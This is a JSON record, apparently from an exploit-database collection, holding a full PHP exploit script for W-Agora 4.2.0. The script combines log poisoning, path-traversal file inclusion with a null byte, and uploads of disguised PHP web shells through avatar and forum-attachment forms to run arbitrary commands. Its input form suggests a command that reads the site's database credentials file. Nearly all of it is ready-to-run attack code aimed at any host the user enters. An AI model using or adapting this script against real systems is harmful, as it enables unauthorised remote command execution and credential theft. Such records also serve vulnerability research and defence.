{
  "id": "1250",
  "title": "w-Agora 4.2.0 - &#039;quicklist.php&#039; Remote Code Execution",
  "cve": null,
  "vuln_type": "rce",
  "code": "<?php\r\n#   --- wagora_420_xpl.php                            13.33 14/10/2005         #\r\n#                                                                              #\r\n#   W-Agora 4.2.0 (possibly prior versions) Remote commands execution          #\r\n#   through quicklist.php and/or upload features                               # \r\n#                                                                              #\r\n#                                by rgod                                       #\r\n#                      site: http://rgod.altervista.org                        #\r\n#                                                                              #\r\n#   make these changes in php.ini if you have troubles                         #\r\n#   to launch this script:                                                     #\r\n#   allow_call_time_pass_reference = on                                        #\r\n#   register_globals = on                                                      #\r\n#                                                                              #\r\n#   usage: launch this script from Apache, fill requested fields, then         #\r\n#   upload a shell right now!                                                  #\r\n#                                                                              #\r\n#   Sun-Tzu: \"So in war, the way is to avoid what is strong and to strike at   #\r\n#   what is weak.\"                                                             #\r\n\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\", 2);\r\nob_implicit_flush (1);\r\n\r\necho'<html><head><title>W-Agora 4.2.0 remote commands execution    </title><meta\r\nhttp-equiv=\"Content-Type\"   content=\"text/html;  charset=iso-8859-1\">     <style\r\ntype=\"text/css\"> body {\tbackground-color:#111111; SCROLLBAR-ARROW-COLOR:#ffffff;\r\nSCROLLBAR-BASE-COLOR: black;    CURSOR: crosshair;    color:   #1CB081; }    img\r\n{background-color:   #FFFFFF   !important}  input  {background-color:   #303030\r\n!important} option {  background-color:   #303030   !important}         textarea\r\n{background-color: #303030 !important} input {color: #1CB081 !important}  option\r\n{color: #1CB081 !important} textarea {color: #1CB081 !important}        checkbox\r\n{background-color: #303030 !important} select {font-weight: normal;       color:\r\n#1CB081;  background-color:  #303030;}  body  {font-size:  8pt       !important;\r\nbackground-color:   #111111;   body * {font-size: 8pt !important} h1 {font-size:\r\n0.8em !important}   h2   {font-size:   0.8em    !important} h3 {font-size: 0.8em\r\n!important} h4,h5,h6    {font-size: 0.8em !important}  h1 font {font-size: 0.8em\r\n!important} \th2 font {font-size: 0.8em !important}h3   font {font-size: 0.8em\r\n!important} h4 font,h5 font,h6 font {font-size: 0.8em !important} * {font-style:\r\nnormal !important} *{text-decoration: none !important} a:link,a:active,a:visited\r\n{ text-decoration: none ; color : #1CBr81; } a:hover{text-decoration: underline;\r\ncolor : #1CB081; } .Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif;\r\nfont-size: 10px; } .Stile6 {font-family: Verdana, Arial, Helvetica,  sans-serif;\r\nfont-weight:bold; font-style: italic;}--></style></head><body><p class=\"Stile6\">\r\nW-Agora 4.2.0 remote commands execution </p><p><class=\"Stile6\"> a  script     by\r\nrgod  at <a href=\"http://rgod.altervista.org\"                   target=\"_blank\">\r\nhttp://rgod.altervista.org</a></p> <table width=\"84%\"><tr><td width=\"43%\"> <form\r\nname=\"form1\" method=\"post\" action=\"'.$SERVER[PHP_SELF].'?path=value&host=value&\r\nport=value&command=value&proxy=value&maxretries=value\"><p><input type=\"text\"\r\nname=\"host\"><span class=\"Stile5\"> hostname (ex: www.sitename.com)</span></p><p>\r\n<input type=\"text\" name=\"path\"><span class=\"Stile5\"> path (ex: /cyphor/ or\r\n/forum/ or just /)</span></p><p><input type=\"text\" name=\"port\"><span\r\nclass=\"Stile5\"> specify a port other than 80 (default value)</span></p><p><input\r\ntype=\"text\" name=\"command\"><span class=\"Stile5\">a shell command, cat ./../../../\r\n../conf/site_agora.php to see database username/password</span></p> <p>   <input\r\ntype=\"text\" name=\"maxretries\"><span class=\"Stile5\">max retries when you make the\r\nGET the shell (uploaded files are ordered by number...default=100)</span></p><p>\r\n<input type=\"text\" name=\"proxy\"><span class=\"Stile5\">send exploit through an\r\nHTTP proxy (ip:port)</span></p><p><input type=\"submit\" name=\"Submit\" value=\"go!\"\r\n></p></form></td></tr></table></body></html>';\r\n\r\n\r\nfunction show($headeri)\r\n{\r\n$ii=0;\r\n$ji=0;\r\n$ki=0;\r\n$ci=0;\r\necho '<table border=\"0\"><tr>';\r\nwhile ($ii <= strlen($headeri)-1)\r\n{\r\n$datai=dechex(ord($headeri[$ii]));\r\nif ($ji==16) {\r\n             $ji=0;\r\n             $ci++;\r\n             echo \"<td>&nbsp;&nbsp;</td>\";\r\n             for ($li=0; $li<=15; $li++)\r\n                      { echo \"<td>\".$headeri[$li+$ki].\"</td>\";\r\n\t\t\t    }\r\n            $ki=$ki+16;\r\n            echo \"</tr><tr>\";\r\n            }\r\nif (strlen($datai)==1) {echo \"<td>0\".$datai.\"</td>\";} else\r\n{echo \"<td>\".$datai.\"</td> \";}\r\n$ii++;\r\n$ji++;\r\n}\r\nfor ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++)\r\n                      { echo \"<td>&nbsp&nbsp</td>\";\r\n                       }\r\n\r\nfor ($li=$ci*16; $li<=strlen($headeri); $li++)\r\n                      { echo \"<td>\".$headeri[$li].\"</td>\";\r\n\t\t\t    }\r\necho \"</tr></table>\";\r\n}\r\n\r\nfunction valid_ipv4($ip_addr)\r\n{\r\n        $num=\"([0-9]|1?\\d\\d|2[0-4]\\d|25[0-5])\";\r\n        $range=\"([1-9]|1\\d|2\\d|3[0-2])\";\r\n\r\n        if(preg_match(\"/^$num\\.$num\\.$num\\.$num(\\/$range)?$/\",$ip_addr))\r\n        {\r\n                return 1;\r\n        }\r\n\r\n        return 0;\r\n}\r\n\r\n\r\nfunction sendpacket($packet)\r\n{\r\nglobal $proxy, $host, $port, $html;\r\nif ($proxy=='')\r\n           {$ock=fsockopen(gethostbyname($host),$port);\r\n            if (!$ock) { echo 'No response from '.htmlentities($host).'...';\r\n\t\t\tdie;\r\n\t\t       }}\r\n\r\n             else\r\n           {\r\n\t   $proxy=trim($proxy);\r\n \t   $parts=explode(':',$proxy);\r\n\t   if (!valid_ipv4($parts[0])) {echo htmlentities($proxy).' -> not a valid proxy...'; die;}\r\n\t   if (intval($parts[1])<=0) {echo htmlentities($proxy).' -> not a valid proxy...'; die;}\r\n\t    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';\r\n\t    $ock=fsockopen($parts[0],$parts[1]);\r\n\t    if (!$ock) { echo 'No response from proxy...';\r\n\t\t\tdie;\r\n\t\t       }\r\n\t   }\r\nfputs($ock,$packet);\r\nif ($proxy=='')\r\n  {\r\n\r\n    $html='';\r\n    while (!feof($ock))\r\n      {\r\n        $html.=fgets($ock);\r\n      }\r\n  }\r\nelse\r\n  {\r\n    $html='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html)))\r\n    {\r\n      $html.=fread($ock,1);\r\n    }\r\n  }\r\nfclose($ock);\r\necho nl2br(htmlentities($html));\r\n}\r\n\r\nif (($path<>'') and ($host<>'') and ($command<>''))\r\n{\r\n\r\n$port=intval($port);\r\nif (($port=='') or ($port<=0)) {$port=80;}\r\nif ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}\r\n$maxretries=intval($maxretries);\r\nif (($maxretries=='') or ($maxretries<=0)) {$maxretries=100;}\r\necho 'Initiating exploit against '.htmlentities($host).':'.htmlentities($port);\r\necho ' with '.htmlentities($maxretries).' as maximum of retries<br>';\r\nif (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}\r\n\r\n\r\n#STEP 0 -> we will try to include a log file...\r\n$up=\"/../../\";\r\nfor ($i=0; $i<=strlen($path)-1; $i++)\r\n{if ($path[$i]=='/') {$up.=\"../\";}}\r\n$packet=\"GET \".$p.\"extras/quicklist.php?fake=\".urlencode(\"<?echo'HiMaster';system(\\$_GET[suntzu]);?>\");\r\n$packet.=\"&suntzu=\".urlencode($command).\"&site=\".$up.\"apache/logs/access.log%00 HTTP/1.1\\r\\n\"; //change the path but keep null char\r\n$packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\\r\\n\";\r\n$packet.=\"Referer: http://\".$host.\"\\r\\n\";\r\n$packet.=\"Accept-Language: en\\r\\n\";\r\n$packet.=\"Accept-Encoding: gzip, deflate\\r\\n\";\r\n$packet.=\"User-Agent: Amiga-AWeb/3.4.167SE\\r\\n\";\r\n$packet.=\"Host: \".$host.\":\".$port.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nshow($packet);\r\nsendpacket($packet);\r\nif (eregi(\"HiMaster\",$html)) {echo '<br>Exploit succeded...'; die;}\r\n\r\n\r\n\r\n#STEP 1 -> we will upload a special avatar...\r\n$data='-----------------------------7d5d24110dfe\r\nContent-Disposition: form-data; name=\"site\"\r\n\r\nagora\r\n-----------------------------7d5d24110dfe\r\nContent-Disposition: form-data; name=\"submitted\"\r\n\r\ntrue\r\n-----------------------------7d5d24110dfe\r\nContent-Disposition: form-data; name=\"perpage\"\r\n\r\n20\r\n-----------------------------7d5d24110dfe\r\nContent-Disposition: form-data; name=\"first\"\r\n\r\n0\r\n-----------------------------7d5d24110dfe\r\nContent-Disposition: form-data; name=\"avatar\"; filename=\"C:\\suntzu.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php\r\necho \"Hi,Master...<br>\";\r\necho nl2br(htmlentities(`$_GET[suntzu]`));\r\n?>\r\n-----------------------------7d5d24110dfe\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nCopy file\r\n-----------------------------7d5d24110dfe--';\r\n\r\n\r\n$packet=\"POST \".$p.\"browse_avatar.php HTTP/1.1\\r\\n\";\r\n$packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\\r\\n\";\r\n$packet.=\"Referer: http://\".$host.\":\".$port.$p.\"browse_avatar.php\\r\\n\";\r\n$packet.=\"Accept-Language: en\\r\\n\";\r\n$packet.=\"Content-Type: multipart/form-data; boundary=---------------------------7d5d24110dfe\\r\\n\";\r\n$packet.=\"Accept-Encoding: gzip, deflate\\r\\n\";\r\n$packet.=\"User-Agent: BigBrother/1.6e\\r\\n\";\r\n$packet.=\"Host: \".$host.\":\".$port.\"\\r\\n\";\r\n$packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n$packet.=\"Connection: close\\r\\n\\r\\n\";\r\n$packet.=\"Cache-Control: no-cache\\r\\n\";\r\n$packet.=$data;\r\nshow($packet);\r\nsendpacket($packet);\r\n\r\n#STEP 2 -> Try to launch commands\r\n$packet=\"GET \".$p.\"images/avatars/suntzu.php?suntzu=\".urlencode($command).\" HTTP/1.1\\r\\n\";\r\n$packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\\r\\n\";\r\n$packet.=\"Referer: http://\".$host.\"\\r\\n\";\r\n$packet.=\"Accept-Language: it\\r\\n\";\r\n$packet.=\"Accept-Encoding: gzip, deflate\\r\\n\";\r\n$packet.=\"User-Agent: bluefish 0.6 HTML editor\\r\\n\";\r\n$packet.=\"Host: \".$host.\":\".$port.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nshow($packet);\r\nsendpacket($packet);\r\nif (eregi(\"Hi,Master...\",$html)) {echo '<br>Exploit succeded...'; die;}\r\n\r\n#STEP 2b -> Try to include shell through quicklist.php\r\n$packet=\"GET \".$p.\"extras/quicklist.php?suntzu=\".urlencode($command).\"&site=/../../../images/avatars/suntzu HTTP/1.1\\r\\n\";\r\n$packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\\r\\n\";\r\n$packet.=\"Referer: http://\".$host.\"\\r\\n\";\r\n$packet.=\"Accept-Language: it\\r\\n\";\r\n$packet.=\"Accept-Encoding: gzip, deflate\\r\\n\";\r\n$packet.=\"User-Agent: curl/7.7.x (i386--freebsd4.3) libcurl 7.7.x (SSL 0.9.6) (ipv6 enabled)\\r\\n\";\r\n$packet.=\"Host: \".$host.\":\".$port.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nshow($packet);\r\nsendpacket($packet);\r\nif (eregi(\"Hi,Master...\",$html)) {echo '<br>Exploit succeded...'; die;}\r\n\r\n#STEP 3 -> retrieve site name string & main page url\r\n$packet=\"GET \".$p.\" HTTP/1.1\\r\\n\";\r\n$packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\\r\\n\";\r\n$packet.=\"Referer: http://\".$host.\"\\r\\n\";\r\n$packet.=\"Accept-Language: it\\r\\n\";\r\n$packet.=\"Accept-Encoding: gzip, deflate\\r\\n\";\r\n$packet.=\"User-Agent: Internet Ninja x.0\\r\\n\";\r\n$packet.=\"Host: \".$host.\":\".$port.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nshow($packet);\r\nsendpacket($packet);\r\n$html2=explode('<html',$html);\r\n$temp=explode('index.php?site=',$html2[1]);\r\nfor ($i=1; $i<=count($temp)-1; $i++){\r\n$temp2=explode(\"'\",$temp[$i]);\r\n$sitename[$i-1]=$temp2[0];\r\n$main[$i-1]=\"index.php?site=\".$sitename[$i-1];\r\necho 'sitename -> '.htmlentities($sitename[$i-1]).' main -> '.htmlentities($main[$i-1]).'<br>';\r\n}\r\n\r\nif (count($sitename)==0) {echo 'Exploit failed for some reason...check the response...'; die;}\r\n\r\n\r\nfor ($x=0; $x<=count($sitename)-1; $x++) //cycling among forums and directories...\r\n\t\t\t\t\t //we search a not .htaccess protected one\r\n{\r\n   #STEP 4 -> retrieve a forum name...\r\n   $packet=\"GET \".$p.$main[$x].\" HTTP/1.1\\r\\n\";\r\n   $packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\\r\\n\";\r\n   $packet.=\"Referer: http://\".$host.\"\\r\\n\";\r\n   $packet.=\"Accept-Language: it\\r\\n\";\r\n   $packet.=\"Accept-Encoding: gzip, deflate\\r\\n\";\r\n   $packet.=\"User-Agent: Nokia-WAPToolkit/1.2 googlebot(at)googlebot.com\\r\\n\";\r\n   $packet.=\"Host: \".$host.\":\".$port.\"\\r\\n\";\r\n   $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n\r\n   show($packet);\r\n   sendpacket($packet);\r\n  // if (!eregi($sitename[$x].\"_\",$html)) {echo 'No forum created there, exploit failed...'; die;}\r\n   $temp=explode($sitename[$x].\"_\",$html);\r\n\r\n   for ($i=1; $i<=count($temp)-1; $i++){\r\n   $temp2=explode('\">',$temp[$i]);\r\n   $forumname[$i-1]=$temp2[0];\r\n   echo 'forumname -> '.htmlentities($forumname[$i-1]).'<br>';\r\n   }\r\n\r\n   for ($y=0; $y<=count($forumname)-1; $y++){\r\n\r\n   \r\n\r\n\r\n#STEP 5 -> Upload a shell...\r\n$data='-----------------------------7d531f1c20007a\r\nContent-Disposition: form-data; name=\"site\"\r\n\r\n'.$sitename[$x].'\r\n-----------------------------7d531f1c20007a\r\nContent-Disposition: form-data; name=\"bn\"\r\n\r\n'.$sitename[$x].'_'.$forumname[$y].'\r\n-----------------------------7d531f1c20007a\r\nContent-Disposition: form-data; name=\"do_post\"\r\n\r\n1\r\n-----------------------------7d531f1c20007a\r\nContent-Disposition: form-data; name=\"back_form\"\r\n\r\npost\r\n-----------------------------7d531f1c20007a\r\nContent-Disposition: form-data; name=\"popup\"\r\n\r\n1\r\n-----------------------------7d531f1c20007a\r\nContent-Disposition: form-data; name=\"no_thanks_msg\"\r\n\r\n\r\n-----------------------------7d531f1c20007a\r\nContent-Disposition: form-data; name=\"lynx\"\r\n\r\n0\r\n-----------------------------7d531f1c20007a\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n1000000\r\n-----------------------------7d531f1c20007a\r\nContent-Disposition: form-data; name=\"filename\"\r\n\r\n\r\n-----------------------------7d531f1c20007a\r\nContent-Disposition: form-data; name=\"actiontype\"\r\n\r\nupload\r\n-----------------------------7d531f1c20007a\r\nContent-Disposition: form-data; name=\"server_file\"\r\n\r\n\r\n-----------------------------7d531f1c20007a\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\n\r\n-----------------------------7d531f1c20007a\r\nContent-Disposition: form-data; name=\"useraddress\"\r\n\r\n\r\n-----------------------------7d531f1c20007a\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n\r\n-----------------------------7d531f1c20007a\r\nContent-Disposition: form-data; name=\"subject\"\r\n\r\n\r\n-----------------------------7d531f1c20007a\r\nContent-Disposition: form-data; name=\"icon\"\r\n\r\nicon1.gif\r\n-----------------------------7d531f1c20007a\r\nContent-Disposition: form-data; name=\"body\"\r\n\r\n\r\n-----------------------------7d531f1c20007a\r\nContent-Disposition: form-data; name=\"pcfile\"; filename=\"C:\\suntzu.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php\r\nerror_reporting(0);\r\necho \"Hi, Sun-Tzu...my master<br>\";\r\necho `$_GET[suntzu]`;\r\n?>\r\n-----------------------------7d531f1c20007a--';\r\n\r\n//used backticks in shell, they are not quotes, but execution operators...\r\n\r\n   $packet=\"POST \".$p.\"insert.php HTTP/1.1\\r\\n\";\r\n   $packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\\r\\n\";\r\n   $packet.=\"Referer: http://\".$host.\":\".$p.\"post.php?bn=\".$sitename[$x].\"_\".$forumname[$y].\"\\r\\n\";\r\n   $packet.=\"Accept-Language: it\\r\\n\";\r\n   $packet.=\"Content-Type: multipart/form-data; boundary=---------------------------7d531f1c20007a\\r\\n\";\r\n   $packet.=\"Accept-Encoding: gzip, deflate\\r\\n\";\r\n   $packet.=\"User-Agent: Netprospector JavaCrawler\\r\\n\";\r\n   $packet.=\"Host: \".$host.\":\".$port.\"\\r\\n\";\r\n   $packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n   $packer.=\"Connection: Close\\r\\n\";\r\n   $packet.=\"Cache-Control: no-cache\\r\\n\\r\\n\";\r\n\r\n   $packet.=$data;\r\n   show($packet);\r\n   sendpacket($packet);\r\n\r\n   #STEP 6 -> Launch commands... including the uploaded file through quicklist.php script\r\n   $i=1;\r\n   while (!eregi(\"Hi, Sun-Tzu...\",$html))\r\n   {\r\n   $packet=\"GET \".$p.\"extras/quicklist.php?suntzu=\".urlencode($command).\"&site=/../../forums/\".$sitename[$x];\r\n   $packet.=\"/\".$forumname[$y].\"/notes/\".$i.\".suntzu HTTP/1.1\\r\\n\";\r\n   $packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\\r\\n\";\r\n   $packet.=\"Referer: http://\".$host.\"\\r\\n\";\r\n   $packet.=\"Accept-Language: it\\r\\n\";\r\n   $packet.=\"Accept-Encoding: gzip, deflate\\r\\n\";\r\n   $packet.=\"User-Agent: online link validator (http://www.dead-links.com/)\\r\\n\";\r\n   $packet.=\"Host: \".$host.\":\".$port.\"\\r\\n\";\r\n   $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n   show($packet);\r\n   sendpacket($packet);\r\n   $i=$i+1;\r\n   if ($i==$maxretries+1) {break;}\r\n   }\r\n   if (eregi(\"Hi, Sun-Tzu...\",$html)) {echo '<br>Exploit succeded...'; die;}\r\n\r\n   #STEP 7 -> Check if you have access to notes directory...\r\n   $packet=\"GET \".$p.\"forums/\".$sitename[$x].\"/\".$forumname[$y].\"/notes/ HTTP/1.1\\r\\n\";\r\n   $packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\\r\\n\";\r\n   $packet.=\"Referer: http://\".$host.\"\\r\\n\";\r\n   $packet.=\"Accept-Language: it\\r\\n\";\r\n   $packet.=\"Accept-Encoding: gzip, deflate\\r\\n\";\r\n   $packet.=\"User-Agent: Gamespy_Arcade, GameSpyHTTP\\r\\n\";\r\n   $packet.=\"Host: \".$host.\":\".$port.\"\\r\\n\";\r\n   $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n   show($packet);\r\n   sendpacket($packet);\r\n\r\n\r\n   if (eregi('200 OK',$html))\r\n   {\r\n\r\n   $i=1;\r\n   while (!eregi(\"Hi, Sun-Tzu...\",$html))\r\n   {\r\n   $packet=\"GET \".$p.\"forums/\".$sitename[$x].\"/\".$forumname[$y].\"/notes/\".$i.\".suntzu.php?suntzu=\".urlencode($command).\" HTTP/1.1\\r\\n\";\r\n   $packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\\r\\n\";\r\n   $packet.=\"Referer: http://\".$host.\"\\r\\n\";\r\n   $packet.=\"Accept-Language: it\\r\\n\";\r\n   $packet.=\"Accept-Encoding: gzip, deflate\\r\\n\";\r\n   $packet.=\"User-Agent: online link validator (http://www.dead-links.com/)\\r\\n\";\r\n   $packet.=\"Host: \".$host.\":\".$port.\"\\r\\n\";\r\n   $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n   show($packet);\r\n   sendpacket($packet);\r\n   $i=$i+1;\r\n   if ($i==$maxretries+1) {break;}\r\n   }\r\n   if (eregi(\"Hi, Sun-Tzu...\",$html)) {echo 'Exploit succeded...'; die;}\r\n   }\r\n\r\nelse\r\n   {echo 'notes directory is .htaccess protected...searching another<br>';}\r\n\r\n}\r\n}\r\n}\r\nelse\r\n{echo 'Fill requested fields, optionally specify a proxy...';}\r\n?>\r\n\r\n# milw0rm.com [2005-10-14]",
  "url": "https://www.exploit-db.com/exploits/1250"
}